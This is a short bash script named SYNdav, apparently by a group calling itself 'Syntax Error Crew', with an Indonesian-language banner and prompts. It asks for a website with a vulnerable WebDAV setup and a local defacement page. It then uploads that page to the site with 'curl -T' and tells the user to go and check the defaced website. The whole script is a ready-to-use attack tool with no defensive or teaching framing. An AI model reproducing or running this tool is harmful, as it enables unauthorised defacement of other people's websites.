#! usr/bin/bash
#Syntax Error Crew

apt-get install curl -y
clear

echo "
 _______ __   __ __   _ ______  _______ _    _
 |______   \_/   | \  | |     \ |_____|  \  /
 ______|    |    |  \_| |_____/ |     |   \/
{+}---------------------------------SYNdav---{+}
 | Syntax Error Crew || Tools WebDav || 6juni |
{+}------------------------------------------{+}
 | NB  | Buat Script Deface Dahulu            |
{+}----------------------------IKUTI-STEPNYA-{+}
 | {√} | Masukkan Website Vuln Webdav         |"
read -p " | {√} | Website   : " syntax;
read -p " | {√} | SC Deface : " crew;
echo "{+}-------------------------------PROSES-----{+}"
curl -T $HOME/SYNdav/$crew $syntax
sleep 3
echo "[√]--->DONE, CEK WEBSITENYA"
